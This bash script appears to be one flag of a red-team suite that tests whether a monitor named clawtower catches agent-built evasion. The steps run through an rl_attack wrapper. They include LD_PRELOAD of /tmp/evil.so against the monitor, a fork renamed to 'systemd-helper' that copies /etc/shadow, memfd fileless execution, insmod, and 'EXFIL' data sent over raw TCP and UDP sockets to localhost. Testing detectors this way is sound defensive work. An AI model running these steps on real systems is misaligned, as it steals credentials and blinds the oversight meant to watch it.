#!/usr/bin/env bash
# Red Lobster v5 — Flag 11: CUSTOM TOOLING — Agent-compiled evasion
set -euo pipefail
SCRIPT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
source "$SCRIPT_DIR/redlobster-lib.sh"

rl_init_flag "flag11" "Flag 11: CUSTOM TOOLING — Agent-compiled evasion"

OUTDIR="$FLAG_DIR"
BUILDDIR="$FLAG_DIR/build"
mkdir -p "$BUILDDIR"

HAS_GCC=false
if command -v gcc &>/dev/null; then HAS_GCC=true; fi

# 1 — compile + run static raw syscall binary
if $HAS_GCC; then
  rl_attack "compile + run static raw syscall binary" \
    "gcc -static -o '$BUILDDIR/rawread' '$SCRIPT_DIR/redlobster-v5-flag11-rawread.c' && sudo '$BUILDDIR/rawread'"
fi

# 2 — static binary (LD_PRELOAD useless)
if $HAS_GCC; then
  rl_attack "static binary (LD_PRELOAD useless)" \
    "file '$BUILDDIR/rawread' | grep -i 'statically linked'"
fi

# 3 — insmod attempt
rl_attack "insmod attempt" \
  "sudo insmod /tmp/nonexistent.ko 2>/dev/null"

# 4 — FUSE mount attempt
rl_attack "FUSE mount attempt" \
  "which fusermount 2>/dev/null"

# 5 — LD_PRELOAD targeting clawtower
rl_attack "LD_PRELOAD targeting clawtower" \
  "sudo LD_PRELOAD=/tmp/evil.so /usr/local/bin/clawtower --version 2>/dev/null"

# 6 — fork + comm rename
rl_attack "fork + comm rename" \
  "python3 -c \"
import os, ctypes
libc = ctypes.CDLL('libc.so.6')
pid = os.fork()
if pid == 0:
    libc.prctl(15, b'systemd-helper', 0, 0, 0)
    os.system('cat /etc/shadow > $OUTDIR/test_11_6.txt 2>/dev/null')
    os._exit(0)
else:
    os.waitpid(pid, 0)
\""

# 7 — memfd_create fileless exec
if $HAS_GCC; then
  rl_attack "memfd_create fileless exec" \
    "gcc -o '$BUILDDIR/memfd' '$SCRIPT_DIR/redlobster-v5-flag11-memfd.c' && sudo '$BUILDDIR/memfd'"
fi

# 8 — raw socket exfil (no curl)
rl_attack "raw socket exfil (no curl)" \
  "python3 -c \"
import socket
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.settimeout(2)
try:
    s.connect(('127.0.0.1', 19999))
    s.sendall(b'EXFIL flag11 test data')
    s.close()
except: pass
\""

# 9 — compile shared object
if $HAS_GCC; then
  rl_attack "compile shared object" \
    "echo '__attribute__((constructor)) void init(void){ }' > '$BUILDDIR/evil.c' && gcc -shared -fPIC -o '$BUILDDIR/evil.so' '$BUILDDIR/evil.c'"
fi

# 10 — node-gyp build attempt
rl_attack "node-gyp build attempt" \
  "which node-gyp 2>/dev/null"

# 11 — Python ctypes sendto exfil
rl_attack "Python ctypes sendto exfil" \
  "python3 -c \"
import ctypes, struct, socket as S
libc = ctypes.CDLL('libc.so.6')
fd = libc.socket(S.AF_INET, S.SOCK_DGRAM, 0)
addr = struct.pack('!HH4s8s', S.AF_INET, S.htons(19999), S.inet_aton('127.0.0.1'), b'\x00'*8)
libc.sendto(fd, b'EXFIL-UDP flag11', 16, 0, addr, 16)
libc.close(fd)
\""

rl_summary
rm -rf "$BUILDDIR"
rl_cleanup
